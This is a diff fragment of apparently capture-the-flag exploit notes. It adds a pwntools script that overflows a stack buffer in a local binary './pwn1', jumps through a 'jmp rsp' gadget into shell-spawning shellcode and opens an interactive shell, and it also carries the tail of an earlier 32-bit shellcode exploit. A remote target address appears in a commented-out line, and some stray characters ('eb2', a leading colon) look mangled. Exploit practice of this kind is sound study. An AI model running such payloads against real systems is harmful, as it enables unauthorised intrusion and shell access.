@@ -21,5 +21,26 @@ payload = shellcode+'\x90'*12+p32(esp-0x24)
 sh.sendline(payload)
 sh.interactive()
 
-    
+
+
+eb2
+:#coding:utf-8
+from pwn import *
+context.log_level = 'debug'
+p = process('./pwn1')
+#p = remote('172.16.5.7',8888)
+print(p.recvuntil("hey, what's your name?"))
+#send jmpesp to id
+jmpesp = asm('jmp rsp',arch='amd64')
+p.sendline(jmpesp)
+print(p.recvuntil('>'))
+p.sendline("1")
+address_jmpesp = 0x00000000006020A0
+
+shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')
+payload = 'A'*40+p64(address_jmpesp)+shellcode
+
+p.sendline(payload)
+p.interactive()
+
   
